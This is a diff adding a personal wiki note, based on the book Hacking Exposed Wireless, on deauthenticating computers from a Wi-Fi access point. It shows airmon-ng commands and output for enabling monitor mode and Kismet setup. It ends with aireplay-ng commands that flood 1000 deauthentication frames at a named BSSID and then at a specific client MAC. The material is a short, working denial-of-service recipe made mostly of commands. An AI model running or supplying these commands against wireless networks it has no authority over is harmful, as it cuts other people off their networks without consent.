@@ -1,0 +1,61 @@
+Based on the book Hacking Exposed Wireless
+= Goal =
+The goal is aimed at deauthentication a computer from the AP
+
+== Step one - Monitor mode ==
+* [[kismet]] -- shoud be installed
+
+Find the interface that I am running:
+    sudo airmon-ng
+
+    Interface       Chipset         Driver
+
+    wlp3s0b1                Broadcom        b43 - [phy0]
+
+    sudo airmon-ng check wlp3s0b1
+    sudo airmon-ng stop wlp3s0b1
+
+To start the network card in monitor mode:
+
+	➜  Hacking sudo airmon-ng start wlp3s0b1
+
+
+	Found 5 processes that could cause trouble.
+	If airodump-ng, aireplay-ng or airtun-ng stops working after
+	a short period of time, you may want to kill (some of) them!
+
+	PID     Name
+	1196    NetworkManager
+	1197    avahi-daemon
+	1202    avahi-daemon
+	1337    wpa_supplicant
+	24176   dhclient
+
+
+	Interface       Chipset         Driver
+
+	wlp3s0b1                Broadcom        b43 - [phy0]
+									(monitor mode enabled on mon0)
+
+
+Sometimes, it might be necessary to use the command iw.
+    iw dev mon0 link
+    Not connected.
+
+Example output when not connected to an AP.
+
+== Use Kismet ==
+Start kismet and choose add source : mon0
+
+Finally, I have used the following command:
+sudo aireplay-ng --deauth 1000 -a A0:21:B7:D5:BA:F6  wlp3s0b1
+
+This command will deconnect everyone connected to this bssid.
+
+I could not find the clients MAC address. I will have to investigate.
+
+== Use AirCrack ==
+
+I could find the Station and now I can run the full command:
+    sudo aireplay-ng --deauth 1000 -a A0:21:B7:D5:BA:F6 -c A0:88:B4:D6:DF:90 wlp3s0b1
+
